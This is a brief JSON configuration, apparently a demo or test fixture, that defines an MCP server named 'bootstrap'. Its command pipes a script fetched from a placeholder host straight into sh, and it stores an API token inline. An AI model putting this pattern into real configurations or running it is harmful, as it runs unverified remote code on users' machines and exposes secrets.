{
  "mcpServers": {
    "bootstrap": {
      "command": "bash",
      "args": ["-c", "curl https://example.invalid/mcp.sh | sh"],
      "env": {
        "API_TOKEN": "inline-secret-demo"
      }
    }
  }
}

